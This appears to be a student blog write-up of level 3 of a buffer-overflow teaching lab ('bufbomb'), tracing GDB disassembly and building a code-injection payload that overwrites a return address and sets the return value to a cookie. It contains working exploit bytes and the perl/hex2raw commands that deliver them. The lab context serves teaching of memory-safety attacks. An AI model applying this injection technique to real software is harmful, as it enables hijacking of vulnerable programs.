---
title: 'Level 3. Ah_Choo!'
date: 2016-07-10
permalink: /posts/2016/07/bufflab-level-3/
tags:
  - computer organization and architecture
  - buffer lab
  - assembly
  - ah_choo!
---

Primary purpose:

At this level we're not going to call any functions/ procedures after function **ah_choo()** was finished, yet we're going to change the return value of function **ah_choo()** (which was worth 1) into our cookie, so that after procedure **test()** was finished in calling function **ah_choo()**, the contents of variable containing the return value of function **ah_choo()** will be replaced by our cookie.  

Ok, for we're not going to call any functions/ procedures, then our focus are only on function **ah_choo()** and procedure **test()**. Let's see what procedure **test()** brings by typing this command on GDB. 

> gdb bufbomb<br />
> (gdb) disas test<br />

**Dump of assembler code for function test:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048dbb <+0>:  |  push  |  %ebx
0x08048dbc <+1>:  |  sub   |  $0x28, %esp
0x08048dbf <+4>:  |  call  |  0x8048da2 <uniqueval>
0x08048dc4 <+9>:  |  mov   |  %eax, 0x1c(%esp)
0x08048dc8 <+13>: |   call |  0x8048d04 <ah_shoo>
0x08048dcd <+18>: |   mov  |  %eax, %ebx
0x08048dcf <+20>: |   call |  0x8048da2 <uniqueval>
0x08048dd4 <+25>: |   mov  |  0x1c(%esp), %edx
0x08048dd8 <+29>: |   cmp  |  %edx, %eax
0x08048dda <+31>: |   je   |  0x8048dea <test+47>
0x08048ddc <+33>: |   movl |  $0x804a26d, (%esp)
0x08048de3 <+40>: |   call |  0x8048810 <puts@plt>
0x08048de8 <+45>: |   jmp  |  0x8048e30 <test+117>
0x08048dea <+47>: |   cmp  |  0x804d10c, %ebx
0x08048df0 <+53>: |   jne  |  0x8048e18 <test+93>
0x08048df2 <+55>: |   mov  |  %ebx, 0x8(%esp)
0x08048df6 <+59>: |   movl |  $0x804a282, 0x4(%esp)
0x08048dfe <+67>: |   movl |  $0x1, (%esp)
0x08048e05 <+74>: |   call |  0x8048900 <__printf_chk@plt>
0x08048e0a <+79>: |   movl |  $0x3, (%esp)
0x08048e11 <+86>: |   call |  0x8049171 <validate>
0x08048e16 <+91>: |   jmp  |  0x8048e30 <test+117>

**-Type < return > to continue, or q < return > to quit-**

We can see that after calling function **ah_shoo()**, procedure **test()** will store the contents of register %eax into register %ebx.

Moreover, at row 0x08048dc4 <+9> we can see that the block of stack frame of procedure **test()** which is located at %esp+0x1c is filled with the contentss of register %eax before calling function **ah_shoo()**.

Afterwards, after calling function **ah_shoo()**, register %edx is filled with the contents of block of stack frame of procedure **test()** which is located at %esp+0x1c. The contents of register %edx is then compared with the contents of register %eax. 

Ok, let's see the contents of register %eax before calling function **ah_shoo()** which is later will be stored into the block of stack with address %esp+0x1c. Use this command: 

> (gdb) q<br />
> gdb bufbomb<br />
> (gdb) b test<br />
> Breakpoint 1 at 0x8048dbb<br />
> (gdb) run -u eksperimen<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048dbb in test ()<br />

Then wee see the contents of procedure **test()**.

> (gdb) disas<br />

**Dump of assembler code for function test:**

Address | Operation | Elements in operation
--- | --- | ---
=> 0x08048dbb <+0>:  |  push   %ebx
0x08048dbc <+1>:  |  sub  |  $0x28,%esp
0x08048dbf <+4>:  |  call |  0x8048da2 <uniqueval>
0x08048dc4 <+9>:  |  mov  |  %eax,0x1c(%esp)
0x08048dc8 <+13>: |   call  |  0x8048d04 <ah_shoo>
0x08048dcd <+18>: |   mov  |  %eax,%ebx
0x08048dcf <+20>: |   call |  0x8048da2 <uniqueval>
0x08048dd4 <+25>: |   mov  |  0x1c(%esp),%edx
0x08048dd8 <+29>: |   cmp  |  %edx,%eax
0x08048dda <+31>: |   je   |  0x8048dea <test+47>
0x08048ddc <+33>: |   movl |  $0x804a26d,(%esp)
0x08048de3 <+40>: |   call |  0x8048810 <puts@plt>
0x08048de8 <+45>: |   jmp  |  0x8048e30 <test+117>
0x08048dea <+47>: |   cmp  |  0x804d10c,%ebx
0x08048df0 <+53>: |   jne  |  0x8048e18 <test+93>
0x08048df2 <+55>: |   mov  |  %ebx,0x8(%esp)
0x08048df6 <+59>: |   movl |  $0x804a282,0x4(%esp)
0x08048dfe <+67>: |   movl |  $0x1,(%esp)
0x08048e05 <+74>: |   call |  0x8048900 <__printf_chk@plt>
0x08048e0a <+79>: |   movl |  $0x3,(%esp)
0x08048e11 <+86>: |   call |  0x8049171 <validate>
0x08048e16 <+91>: |   jmp  |  0x8048e30 <test+117>

**-Type < return > to continue, or q < return > to quit-**

> Quit<br />
> (gdb) ni<br />
> 0x08048dbc in test ()<br />
> (gdb) ni<br />
> 0x08048dbf in test ()<br />
> (gdb) ni<br />
> 0x08048dc4 in test ()<br />

Then we also see the register's info.

> (gdb) i r<br />

Info register | | |
--- | --- | ---
eax      |      0x3995b132  |  966111538
ecx      |      0xf7fba068  |  -134504344
edx      |      0xf7fba3cc  |  -134503476
ebx      |      0x0  |  0
esp      |      0x55683698  |  0x55683698 <_reserved+1037976>
ebp      |      0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi      |      0x3  |  3
edi      |      0x0  |  0
eip      |      0x8048dc8   |  0x8048dc8 <test+13>
eflags   |      0x212  |  [ AF IF ]
cs       |      0x23  |  35
ss       |      0x2b  |  43
ds       |      0x2b  |  43
es       |      0x2b  |  43
fs       |      0x0  |  0
gs       |      0x63  |  99

It can be seen that the contents of register %eax is 0x3995b132 before calling function **ah_shoo()**. Let's see the contents of the stack at address %esp+0x1c. 

> (gdb) ni<br />
> (gdb) x/20x $esp<br />

The contents of stack | | | | |
--- | --- | --- | --- | ---
0x55683698 <_reserved+1037976>:  |  0xf7fbaac0  |  0x0000000a  |  0x0000000f  |  0xf7e12700
0x556836a8 <_reserved+1037992>:  |  0x55685ff0  |  0xf7ff0500  |  0x55685680  |  0x3995b132
0x556836b8 <_reserved+1038008>:  |  0x00000003  |  0x00000000  |  0x00000000  |  0x08048e87
0x556836c8 <_reserved+1038024>:  |  0x0804a2a6  |  0x000000f4  |  0x00001fa0  |  0x00000000
0x556836d8 <_reserved+1038040>:  |  0x00000000  |  0x00000000  |  0xf4f4f4f4  |  0xf4f4f4f4

> (gdb) x/ 0x55683698+0x1c<br />
> 0x556836b4 < _reserved+1038004 >:    0x3995b132<br />

It is true that the contents of stack at address 0x556836b4 already contains the contents of register %eax. Next, procedure **test()** calls function **ah_shoo()**. Type this command and in this case I gave an input 'A' as much as 5 times.

> (gdb) ni<br />
> AAAAA<br />
> 0x08048dcd in test ()<br />

> (gdb) disas ah_choo<br />

**Dump of assembler code for function ah_choo:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048cec <+0>:  |   sub  |  $0x4c, %esp
0x08048cef <+3>:  |   lea  |  0x18(%esp), %eax
0x08048cf3 <+7>:  |   mov  |  %eax, (%esp)
0x08048cf6 <+10>: |   call |  0x8048c56 <Gets>
0x08048cfb <+15>: |   mov  |  $0x1, %eax
0x08048d00 <+20>: |   add  |  $0x4c, %esp
0x08048d03 <+23>: |   ret  |

**End of assembler dump.**

From function **ah_choo()**, it can be seen that register %eax will be storing the return value of function **ah_choo()** (which is initially worth 1). It means that our remaining task is to change the contents of register %eax into our cookie.
 
Let's see the contents of function **ah_shoo()** so that we know whether there's any changes in register %eax or not. 
 
> (gdb) disas ah_shoo<br />

**Dump of assembler code for function ah_shoo:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048d04 <+0>:  |  sub   |  $0xc, %esp
0x08048d07 <+3>:  |  call  |  0x8048cec <ah_choo>
0x08048d0c <+8>:  |  add   |  $0xc, %esp
0x08048d0f <+11>:  |   ret  |

**End of assembler dump.**

It can be seen that there's no any changes in register %eax so that we can confirmed that the return value of function **ah_choo()** is always located on register %eax after function **ah_choo()** was finished. Also note that the return address of function **ah_choo()** is 0x08048d0c.  

Let's get started!

As we'll change the contents of register %eax, then we'll do the similar way as the previous level which means we'll do it through code injection. In our code injection there must be a command to change the contents of register %eax into our cookie. Afterwards we must insert the return address of function **ah_choo()** as we'll return to procedure **test()** after this function was finished. Then the last instruction is just a return.

Here's the code:

> movl $0x1d9ed824, %eax<br />
> pushl $0x08048d0c<br />
> ret<br />

The first row changes the contents of register %eax into our cookie.

The second row inserts the return address of function **ah_choo()** into the stack, then returned at the last row.

Open your terminal (not on GDB) and type this compilation command. (file name: assemblylvl3.s).

> gcc -m32 -c assemblylvl3.s<br />
> objdump -d assemblylvl3.o > assemblylvl3.d<br />
> cat assemblylvl3.d<br />

Will give this result:

The compiled code: | | |
--- | --- | ---
assemblylvl3.o:     file format elf32-i386 | | 
Disassembly of section .text: | |
00000000 <.text>: | |
0:    b8 24 d8 9e 1d    |       mov  |  $0x1d9ed824, %eax
5:    68 0c 8d 04 08    |       push |  $0x8048d0c
a:    c3                |       ret  |

Then the next step is creating a string input which is formed by 52 different characters, the return address changed into the starting address of our code injection, and the hexa code of our code injection. To do that, use this command (not on GDB): 

> * perl -e 'print "61 "x32, "62 "x20, "88 36 68 55 ", "b8 24 d8 9e 1d 68 0c 8d 04 08 c3"' > hex0<br />
> * ./hex2raw < hex0 > raw0<br />

The value **88 36 68 55** is the starting address of our code injection. It can be checked the same way as we did on level 2.  

Then, use this command:

> gdb bufbomb<br />
> (gdb) b test<br />
> Breakpoint 1 at 0x8048dbb<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048dbb in test ()<br />

And let's see the contents of procedure **test()**.

> (gdb) disas<br />

**Dump of assembler code for function test:**

Address | Operation | Elements in operation
--- | --- | ---
=> 0x08048dbb <+0>:  |  push   %ebx
0x08048dbc <+1>:  |  sub  |  $0x28,%esp
0x08048dbf <+4>:  |  call |  0x8048da2 <uniqueval>
0x08048dc4 <+9>:  |  mov  |  %eax,0x1c(%esp)
0x08048dc8 <+13>:  |  call  |  0x8048d04 <ah_shoo>
0x08048dcd <+18>:  |  mov  |  %eax,%ebx
0x08048dcf <+20>:  |  call  |  0x8048da2 <uniqueval>
0x08048dd4 <+25>:  |  mov  |  0x1c(%esp),%edx
0x08048dd8 <+29>:  |  cmp  |  %edx,%eax
0x08048dda <+31>:  |  je   |  0x8048dea <test+47>
0x08048ddc <+33>:  |  movl  |  $0x804a26d,(%esp)
0x08048de3 <+40>:  |  call  |  0x8048810 <puts@plt>
0x08048de8 <+45>:  |  jmp  |  0x8048e30 <test+117>
0x08048dea <+47>:  |  cmp  |  0x804d10c,%ebx
0x08048df0 <+53>:  |  jne  |  0x8048e18 <test+93>
0x08048df2 <+55>:  |  mov  |  %ebx,0x8(%esp)
0x08048df6 <+59>:  |  movl  |  $0x804a282,0x4(%esp)
0x08048dfe <+67>:  |  movl  |  $0x1,(%esp)
0x08048e05 <+74>:  |  call |  0x8048900 <__printf_chk@plt>
0x08048e0a <+79>:  |  movl |  $0x3,(%esp)
0x08048e11 <+86>:  |  call |  0x8049171 <validate>
0x08048e16 <+91>:  |  jmp  |  0x8048e30 <test+117>

**-Type < return > to continue, or q < return > to quit-**

And continue with this command.

> Quit<br />
> (gdb) ni<br />
> 0x08048dbc in test ()<br />
> (gdb) ni<br />
> 0x08048dbf in test ()<br />
> (gdb) ni<br />
> 0x08048dc4 in test ()<br />
> (gdb) ni<br />
> 0x08048dc8 in test ()<br />
> (gdb) ni<br />
> 0x08048dcd in test ()<br />
> (gdb) ni<br />
> 0x08048dcf in test ()<br />

After 6 instructions (**ni**), let's see the contents of registers.

> (gdb) i r<br />

Info register | | |
--- | --- | ---
eax      |      0x1d9ed824  |  496949284
ecx      |      0xf7fbb8a4  |  -134498140
edx      |      0xa  |  10
ebx      |      0x1d9ed824  |  496949284
esp      |      0x55683698  |  0x55683698 <_reserved+1037976>
ebp      |      0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi      |      0x3  |  3
edi      |      0x0  |  0
eip      |      0x8048dcf  |  0x8048dcf <test+20>
eflags   |      0x212  |  [ AF IF ]
cs       |      0x23  |  35
ss       |      0x2b  |  43
ds       |      0x2b  |  43
es       |      0x2b  |  43
fs       |      0x0  |  0
gs       |      0x63  |  99

After 6 instructions was executed, then we were out of function **ah_shoo()** and it turned out that register %ebx had the same value as our cookie! 

Let's continue by looking at the comparison between register %edx and %eax. Use this command:

> (gdb) ni<br />
> 0x08048dd4 in test ()<br />
> (gdb) ni<br />
> 0x08048dd8 in test ()<br />
> (gdb) ni<br />
> 0x08048dda in test ()<br />
> (gdb) i r<br />

Info register | | |
--- | --- | ---
eax      |      0x2525bec0  |  623230656
ecx      |      0xf7fba068  |  -134504344
edx      |      0x2525bec0  |  623230656
ebx      |      0x1d9ed824  |  496949284
esp      |      0x55683698  |  0x55683698 <_reserved+1037976>
ebp      |      0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi      |      0x3  |  3
edi      |      0x0  |  0
eip      |      0x8048dda  |  0x8048dda <test+31>
eflags   |      0x246  |  [ PF ZF IF ]
cs       |      0x23  |  35
ss       |      0x2b  |  43
ds       |      0x2b  |  43
es       |      0x2b  |  43
fs       |      0x0  |  0
gs       |      0x63  |  99

Great! We can see that the contentss of register %edx is the same with the contents of register %eax. This means we can move on to the next Assembly instruction on procedur **test()**. 

As register %ebx had the same value as our cookie, this means we can confirmed that the comparison process between register %ebx and the contentss of address 0x804d10c is absolutely on the right track. We can proceed to the final step!

Just use this command:

> (gdb) c<br />
> Continuing.<br />
> OK: ah_choo 0x1d9ed824<br />
> VALID<br />
> Selamat!<br />
> [Inferior 1 (process 5043) exited normally]<br />

Finally!!!
